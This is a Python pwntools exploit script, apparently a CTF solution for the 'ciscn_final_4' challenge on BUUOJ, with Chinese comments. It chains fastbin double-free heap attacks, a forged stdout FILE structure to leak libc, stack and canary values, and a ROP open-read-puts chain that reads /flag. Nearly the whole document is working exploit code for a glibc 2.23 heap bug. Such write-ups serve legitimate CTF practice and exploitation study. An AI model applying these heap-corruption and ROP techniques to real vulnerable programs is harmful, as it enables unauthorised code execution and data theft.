# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './ciscn_final_4'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-old/libc-2.23.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28188'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 1
    while 1 :
        try:
            i+=0
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>>',num)

def add(size,text):
    cmd(1)
    sla('size?',size)
    sa('content?',text)

def delete(idx):
    cmd(2)
    sla('index ?',idx)

def show(idx):
    cmd(3)
    sla('index ?',idx)


# one_gad = one_gadget(libc.path)
sla('name?',flat('/flag\x00\x00\x00',0,0x80))
add(0x90 ,  '0')
add(0x68 ,  '1')
add(0x68 ,  '2')

delete(0)
show(0)
__malloc_hook = l64() - 0x68
libc.address = __malloc_hook - libc.sym['__malloc_hook']
environ = libc.sym['__environ']
_IO_2_1_stdout_ = libc.sym['_IO_2_1_stdout_']
open_addr = libc.sym['openat']
read_addr = libc.sym['read']
puts_addr = libc.sym['puts']
pop_rdi_ret = 0x0000000000021102 + libc.address
pop_rsi_ret = 0x00000000000202e8 + libc.address
pop_rdx_ret = 0x0000000000001b92 + libc.address
add_rsp_0x28_ret = 0x0000000000034ad2 + libc.address

# 这题用不了 open 函数，应该可以用系统调用的方式
# 但还有一个和 open 类似的 openat 函数

delete(1)
delete(2)
delete(1)

add(0x68 , p64(_IO_2_1_stdout_ - 0x43))
add(0x68 , '4')
add(0x68 , '5')

fake_io = '\x00'*0x33 + flat(0xfbad1800 , 0,0,0 ,environ,environ + 0x8)
add(0x68 , fake_io)
stack_addr = l64()

stack_fack_chunk = stack_addr - 520
lg('stack_fack_chunk',stack_fack_chunk + 8)
add(0x90 ,  '7')
add(0x78 ,  '8')
add(0x78 ,  '9')

delete(8)
delete(9)
delete(8)

add(0x78 ,  p64(stack_fack_chunk + 8))
add(0x78 , '11')
add(0x78 , '12')

filename_addr = stack_fack_chunk 
flag_addr = stack_fack_chunk + 0x200

rop = flat(pop_rdi_ret , 0 , pop_rsi_ret , stack_fack_chunk + 0x50 , pop_rdx_ret , 0x100 , read_addr)
# 这里用 open 的话是刚好够用的，但若用 openat 就不够了
# 需要先用 read 读取 rop 链来延长控制

add(0x78, rop)

add(0x38, '14')
add(0x38, '15')
delete(14)
delete(15)
delete(14)
add(0x38, p64(stack_fack_chunk - 0x36 -8 ))
add(0x38 , '17')
add(0x38 , '18')

add(0x68 , '19')
add(0x68 , '20')
delete(19)
delete(20)
delete(19)

add(0x68 , p64(_IO_2_1_stdout_ - 0x43))
add(0x68 , '22')
add(0x68 , '23')

fake_io = '\x00'*0x33 + flat(0xfbad1800 , 0,0,0 ,stack_addr - 0x100,stack_addr - 0xf8)
add(0x68 , fake_io)

canary = u64(p.recv(8))
lg('canary',canary)

payload = '\x00'*6 + flat(canary , 0, add_rsp_0x28_ret )
# 这里巧妙地用了 add_rsp_0x28_ret 把 rip 滑到了下面

# dbg('malloc')
add(0x38 , payload)
# dbg()

flag_addr = stack_fack_chunk + 0x50 + 0x88
orw  = flat(pop_rdi_ret , 0 , pop_rsi_ret , filename_addr ,pop_rdx_ret,0, open_addr )
orw += flat(pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_ret , 0x30 , read_addr)
orw += flat(pop_rdi_ret , flag_addr , puts_addr) + '/flag\x00'

# 这里不知道为啥flag前一定要加/，之前我记得是可以不用的

se(orw)

p.interactive()

'''
@File    :   ciscn_final_4.PY
@Time    :   2021/08/26 16:42:50
@Author  :   Niyah 
'''